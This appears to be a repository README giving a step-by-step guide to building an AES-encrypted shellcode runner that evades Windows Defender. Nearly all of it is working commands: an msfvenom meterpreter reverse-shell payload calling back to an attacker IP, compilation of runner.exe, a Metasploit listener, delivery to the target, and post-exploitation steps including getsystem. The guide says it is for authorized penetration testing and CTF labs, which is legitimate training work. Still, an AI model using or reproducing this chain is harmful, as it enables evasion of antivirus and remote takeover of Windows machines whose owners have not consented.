# 🚀 Custom AES Shellcode Runner & Evasion Framework

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Platform](https://img.shields.io/badge/platform-Kali%20Linux-red)
![Target](https://img.shields.io/badge/target-Windows%2010%2F11-blue)

## 📌 Overview

This repository provides a complete, step-by-step methodology for generating a custom Windows shellcode runner. It is designed to bypass static signature-based detection (Windows Defender) by encrypting the raw shellcode using AES-128-CBC and compiling it into a custom C++ executable (`runner.exe`). 

This guide is strictly for **educational purposes, CTF challenges, and authorized penetration testing** (e.g., HTB, OSCP labs, or environments with a signed RoE).

## 🛠️ Prerequisites & Environment Setup

To ensure a clean build environment, install the following dependencies on your Kali Linux machine.

```bash
# 1. Update system and install required packages
sudo apt update && sudo apt upgrade -y
sudo apt install -y git python3 python3-pip mingw-w64

# 2. Install Python AES library (PyCryptodome)
pip3 install pycryptodome

# 3. Clone the shellcode runner repository
git clone https://github.com/jaytiwari05/shellcoderunner.git
cd shellcoderunner
🏗️ Step-by-Step Execution Guide
Step 1: Generate Raw Shellcode
Standard msfvenom payloads (.exe) are heavily signatured. We generate raw shellcode instead to avoid PE header signatures.


# Replace LHOST with YOUR Kali Linux IP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.35 LPORT=443 -f raw -o payload.bin
Step 2: Encrypt and Compile the Loader
Use the shellcoderunner script to apply AES-128-CBC encryption to the raw shellcode and compile it into a Windows executable using MinGW.


python3 shellcoderunneraes.py payload.bin --aes MySecretPassword --compile
Expected Output: [+] Build successful: runner.exe

Step 3: Set Up the Metasploit Listener
Open a new terminal and configure the handler to catch the reverse shell. Crucial: Ensure LHOST is your Kali IP.


msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.35
set LPORT 443
set ExitOnSession false
exploit -j
Step 4: Delivery and Execution
Transfer runner.exe to the target Windows machine and execute it. Upon execution, the loader decrypts the shellcode in memory and connects back.

Step 5: Post-Exploitation & Shell Interaction
Once the session opens, interact with it:


# List active sessions
sessions -l

# Interact with Session 1
sessions -i 1

# Verify target system info and user privileges
sysinfo
getuid
getsystem
Drop into a standard Windows command shell for further enumeration:


shell
whoami /priv
systeminfo
